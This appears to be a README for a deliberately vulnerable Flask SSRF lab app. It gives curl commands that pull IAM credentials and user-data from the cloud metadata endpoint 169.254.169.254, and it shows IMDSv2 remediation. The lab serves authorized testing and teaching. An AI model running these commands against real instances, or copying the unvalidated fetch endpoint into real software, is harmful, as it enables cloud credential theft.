# SSRF Lab — IMDSv1 Test App

A deliberately vulnerable Flask "URL Preview" app for **authorized** SSRF
testing. Deploy it on a cloud instance that still allows **IMDSv1**
(instance metadata without a session token) and use it to prove that an
attacker can reach the metadata endpoint and steal instance credentials.

> ⚠️ Do not expose this to the public internet. It fetches any URL you give it.

## The vulnerability

`GET /fetch?url=<anything>` fetches the URL **server-side** with no
scheme/host validation and returns the response body. Because the request
originates from the instance, `169.254.169.254` is reachable.

## Run it

```bash
cd ssrf-lab
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
python app.py              # listens on 0.0.0.0:5000
```

Open `http://<instance-ip>:5000/`.

## Exploit (IMDSv1)

From the browser UI, or with curl against the app:

```bash
# 1. List metadata
curl "http://<instance-ip>:5000/fetch?url=http://169.254.169.254/latest/meta-data/"

# 2. Find the IAM role attached to the instance
curl "http://<instance-ip>:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 3. Dump temporary credentials for that role
curl "http://<instance-ip>:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"

# 4. Read user-data (often contains secrets / bootstrap scripts)
curl "http://<instance-ip>:5000/fetch?url=http://169.254.169.254/latest/user-data"
```

Step 3 returns `AccessKeyId`, `SecretAccessKey`, and `Token` — the whole
point of the IMDSv1 SSRF chain.

## Why IMDSv1 matters

IMDSv1 answers any GET to `169.254.169.254` with no proof of intent, so a
single SSRF primitive is enough. **IMDSv2** requires a `PUT` to obtain a
session token first (and enforces a hop limit), which this simple GET-only
SSRF cannot do — testing this app against an IMDSv2-only instance should
**fail**, demonstrating the mitigation.

### Enforce IMDSv2 to remediate (AWS)

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id <id> \
  --http-tokens required \
  --http-endpoint enabled \
  --http-put-response-hop-limit 1
```
